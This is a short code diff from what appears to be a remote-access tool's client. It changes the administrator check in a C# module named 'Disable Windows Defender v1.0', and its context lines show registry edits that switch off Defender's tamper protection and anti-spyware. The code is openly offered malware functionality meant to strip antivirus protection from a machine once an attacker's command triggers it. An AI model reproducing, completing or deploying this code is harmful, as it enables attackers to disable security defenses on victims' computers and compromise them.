@@ -2,6 +2,7 @@
 using Microsoft.Win32;
 using System.Diagnostics;
 using System.Security.Principal;
+using Client.Helper;
 
 //       │ Author     : NYAN CAT
 //       │ Name       : Disable Windows Defender v1.0
@@ -15,7 +16,7 @@ namespace Client.Handle_Packet
     {
         public HandleWindowsDefender()
         {
-            if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator)) return;
+            if (!Methods.IsAdmin()) return;
             
             RegistryEdit(@"SOFTWARE\Microsoft\Windows Defender\Features", "TamperProtection", "0"); //Windows 10 1903 Redstone 6
             RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiSpyware", "1");
